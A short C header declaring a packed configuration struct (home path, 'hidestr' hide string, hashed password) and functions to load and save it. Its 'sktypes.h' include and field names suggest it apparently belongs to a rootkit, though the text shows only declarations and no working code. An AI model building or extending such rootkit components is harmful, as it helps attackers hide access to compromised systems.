/*
 * $Id: config.c, self-configuring stuff
 */

#ifndef CONFIG_H
#define CONFIG_H

#include "sktypes.h"

struct	config {
	char	home[256];
	char	hidestr[16];
	uchar	hashpass[20];
} __attribute__ ((packed));

extern	struct config cfg;
extern	int	configure(char *f, struct config *c);
extern	int	load_config(char *f, struct config *c);
extern	int	save_config(char *f, struct config *c);

#define	CONF_MAGIC_SIZE	64
#define	CONF_KEY_SIZE	64

#endif
